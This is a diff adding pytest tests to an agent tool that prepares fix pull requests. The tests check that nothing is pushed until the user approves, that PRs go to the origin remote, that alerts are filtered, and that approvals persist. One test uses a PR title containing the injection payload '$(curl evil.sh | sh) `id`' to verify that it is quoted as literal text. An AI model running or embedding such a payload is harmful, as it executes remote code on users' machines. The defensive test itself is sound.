@@ -16,6 +16,7 @@ from medic import agent as agent_mod
 from medic import dashboard, delivery, paths, project
 from medic.agent import Medic
 from medic.incidents import Incident
+from medic.incidents import save as save_incident     # the real one (pr_medic stubs the module's)
 
 
 @pytest.fixture
@@ -245,7 +246,7 @@ def test_a_restart_tracks_the_pr_it_already_opened(tmp_path, monkeypatch):
 
     def run(cmd, **kw):
         calls.append(cmd[:3])
-        out = json.dumps([{"url": "https://github.com/u/app/pull/7", "state": "OPEN"}]) if cmd[:3] == ["gh", "pr", "list"] else ""
+        out = json.dumps([{"url": "https://github.com/u/app/pull/7", "state": "OPEN"}]) if cmd[:3] == ["gh", "pr", "list"]             else "https://github.com/u/app.git" if cmd[:3] == ["git", "remote", "get-url"] else ""
         return SimpleNamespace(returncode=0, stdout=out, stderr="")
     monkeypatch.setattr(delivery.subprocess, "run", run)
     inc = Incident(signals=[], release="b" * 40, healthy_release="a" * 40, trace_ids=[], id="inc1")
@@ -370,3 +371,131 @@ def test_a_cancelled_answer_fails_its_case_without_stalling_the_run(tmp_path, en
     results = {r["id"]: r for r in json.loads(out.read_text())["cases"]}
     assert results["where"]["passed"] and results["where again"]["passed"], proc.stderr[-500:]
     assert results["cancel"]["status"] == "error" and "cancelled" in results["cancel"]["error"]
+
+
+def test_a_ready_pr_is_prepared_but_not_opened_until_the_user_says(pr_medic, monkeypatch):
+    m, inc = pr_medic
+    monkeypatch.setattr(delivery, "repo", lambda root: "u/app")
+    monkeypatch.setattr(paths, "PROJECT", project.Project(root=paths.MEDIC_DIR, entrypoint="app:answer", mode="pr",
+                                                          pr="ready"))
+    pushed = []
+    monkeypatch.setattr(delivery, "open_pr", lambda inc, branch, base, root, title: pushed.append(branch) or
+                        {"url": "https://github.com/u/app/pull/7", "branch": branch, "base": base})
+    m.do_deploy(inc)
+    ready = inc.deploy["ready"]
+    assert inc.phase == "pr_ready" and pushed == []                         # nothing left this machine
+    assert ready["commands"][0] == "git push origin medic/fix-inc1"
+    assert "gh pr create --repo u/app --base main --head medic/fix-inc1" in ready["commands"][1]
+    assert "Agent Medic" in open(ready["body_file"], encoding="utf-8").read()
+    monkeypatch.setattr(delivery, "existing_pr", lambda branch, root, closed=False: "")
+    m.do_pr_ready(inc)
+    assert inc.phase == "pr_ready" and pushed == []                         # still waiting for the user
+    agent_mod.incidents.approve(inc.id)                                    # agent-medic approve <id>
+    m.do_pr_ready(inc)
+    assert pushed == ["medic/fix-inc1"] and inc.phase == "awaiting_merge" and inc.deploy["pr"]["url"].endswith("/7")
+
+
+def test_a_ready_pr_opened_by_hand_is_picked_up(pr_medic, monkeypatch):
+    m, inc = pr_medic
+    monkeypatch.setattr(delivery, "repo", lambda root: "u/app")
+    monkeypatch.setattr(paths, "PROJECT", project.Project(root=paths.MEDIC_DIR, entrypoint="app:answer", mode="pr",
+                                                          pr="ready"))
+    m.do_deploy(inc)
+    monkeypatch.setattr(delivery, "existing_pr", lambda branch, root, closed=False: "https://github.com/u/app/pull/12")
+    m.do_pr_ready(inc)
+    assert inc.phase == "awaiting_merge" and inc.deploy["pr"]["url"].endswith("/12")
+    from dataclasses import asdict
+    assert dashboard.incident_view(asdict(inc))["pr"]["url"].endswith("/12")   # the dashboard links it
+
+
+def test_medic_toml_keeps_the_pr_setting(tmp_path):
+    proj = project.Project(root=tmp_path, entrypoint="app:answer", pr="ready")
+    project.write(proj)
+    assert project.load(tmp_path / "medic.toml").pr == "ready"
+
+
+def test_prs_go_to_the_origin_remote_never_the_upstream(tmp_path):
+    git(tmp_path, "init", "-q", "-b", "main")
+    git(tmp_path, "remote", "add", "origin", "https://github.com/thebhavye/langchain-rag-tutorial.git")
+    git(tmp_path, "remote", "add", "upstream", "https://github.com/pixegami/langchain-rag-tutorial.git")
+    assert delivery.repo(tmp_path) == "thebhavye/langchain-rag-tutorial"
+    git(tmp_path, "remote", "set-url", "origin", "git@github.com:thebhavye/langchain-rag-tutorial.git")
+    assert delivery.repo(tmp_path) == "thebhavye/langchain-rag-tutorial"
+    git(tmp_path, "remote", "set-url", "origin", "https://github.company.com/team/app.git")
+    assert delivery.repo(tmp_path) == "github.company.com/team/app"           # GitHub Enterprise keeps its host
+    git(tmp_path, "remote", "set-url", "origin", "git@github.company.com:team/app.git")
+    assert delivery.repo(tmp_path) == "github.company.com/team/app"
+    git(tmp_path, "remote", "set-url", "origin", "https://gitlab.com/x/y.git")
+    with pytest.raises(delivery.DeliveryError, match="not a GitHub repo"):
+        delivery.repo(tmp_path)
+
+
+def test_an_alert_counts_only_with_sample_traces_from_this_deployment(pr_medic, monkeypatch):
+    m, _ = pr_medic
+    now = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
+    fires = [{"id": "a1", "ruleName": "Medic: tool call failed (3 in 5 min)", "sampleTraceIds": [], "firedAt": now},
+             {"id": "a2", "ruleName": "Medic: tool call failed (3 in 5 min)", "sampleTraceIds": ["other-app"],
+              "firedAt": now},
+             {"id": "a3", "ruleName": "Medic: non-answers", "sampleTraceIds": ["ours-1", "other-app"], "firedAt": now}]
+    monkeypatch.setattr(m, "_neatlogs", lambda: object(), raising=False)
+    monkeypatch.setattr(agent_mod.neatlogs_link, "new_alerts", lambda api, since=None: fires)
+    m.watcher.read_samples = lambda ids: ([i for i in ids if i.startswith("ours")], [])
+    logged = []
+    m.log = logged.append
+    assert [a["ruleName"] for a in m._neatlogs_alerts()] == ["Medic: non-answers"]
+    assert sum("ignored" in line for line in logged) == 2
+
+
+def test_an_alert_whose_samples_cannot_be_read_yet_is_tried_again(pr_medic, monkeypatch):
+    m, _ = pr_medic
+    now = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
+    fresh = [{"id": "a1", "ruleName": "Medic: non-answers", "sampleTraceIds": ["ours-1"], "firedAt": now}]
+    monkeypatch.setattr(m, "_neatlogs", lambda: object(), raising=False)
+    monkeypatch.setattr(agent_mod.neatlogs_link, "new_alerts", lambda api, since=None: fresh)
+    m.log = lambda line: None
+    m.watcher.read_samples = lambda ids: ([], list(ids))                 # neatlogs hiccup: unreadable
+    assert m._neatlogs_alerts() == []
+    fresh = []                                                           # already marked seen by neatlogs_link
+    m.watcher.read_samples = lambda ids: (list(ids), [])                 # readable again
+    assert [a["id"] for a in m._neatlogs_alerts()] == ["a1"]             # not lost
+    assert agent_mod.neatlogs_link.load().get("retry_alerts") == []
+    old = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() - 3600))
+    fresh = [{"id": "a2", "ruleName": "Medic: non-answers", "sampleTraceIds": ["x"], "firedAt": old}]
+    m.watcher.read_samples = lambda ids: ([], list(ids))
+    assert m._neatlogs_alerts() == [] and not agent_mod.neatlogs_link.load().get("retry_alerts")   # too old to wait
+
+
+def test_the_printed_commands_never_run_a_model_written_title(tmp_path, monkeypatch):
+    import shlex
+    monkeypatch.setattr(delivery, "repo", lambda root: "u/app")
+    inc = Incident(signals=[], release="b" * 40, healthy_release="a" * 40, trace_ids=[], id="inc1")
+    title = 'Fix $(curl evil.sh | sh) `id` "x"\nsecond line'
+    ready = delivery.prepare_pr(inc, "medic/fix-inc1", "main", title, tmp_path, tmp_path)
+    argv = shlex.split(ready["commands"][1])                              # what a POSIX shell would run
+    assert argv[:3] == ["gh", "pr", "create"]
+    assert argv[argv.index("--title") + 1] == 'Fix $(curl evil.sh | sh) `id` "x" second line'   # literal text
+
+
+def test_a_ready_pr_opened_and_closed_between_checks_ends_the_wait(pr_medic, monkeypatch):
+    m, inc = pr_medic
+    monkeypatch.setattr(delivery, "repo", lambda root: "u/app")
+    monkeypatch.setattr(paths, "PROJECT", project.Project(root=paths.MEDIC_DIR, entrypoint="app:answer", mode="pr",
+                                                          pr="ready"))
+    m.do_deploy(inc)
+    monkeypatch.setattr(delivery, "existing_pr", lambda branch, root, closed=False:
+                        "https://github.com/u/app/pull/13" if closed else "")
+    m.do_pr_ready(inc)
+    monkeypatch.setattr(delivery, "state", lambda url, root: {"state": "CLOSED", "merge_commit": None})
+    m.do_await_merge(inc)
+    assert inc.phase == "escalated"
+
+
+def test_an_approval_survives_the_daemon_saving_its_older_copy(pr_medic, monkeypatch, tmp_path):
+    m, inc = pr_medic
+    from dataclasses import asdict
+    monkeypatch.setattr(paths, "INCIDENTS", tmp_path / "incidents")
+    stale = Incident(**asdict(inc))                                       # the daemon's copy, mid-step
+    agent_mod.incidents.approve(inc.id)                                   # agent-medic approve <id>
+    save_incident(stale)                                                  # the daemon saves its older copy
+    [reloaded] = agent_mod.incidents.load_all()
+    assert agent_mod.incidents.approved(reloaded)                         # the approval survives
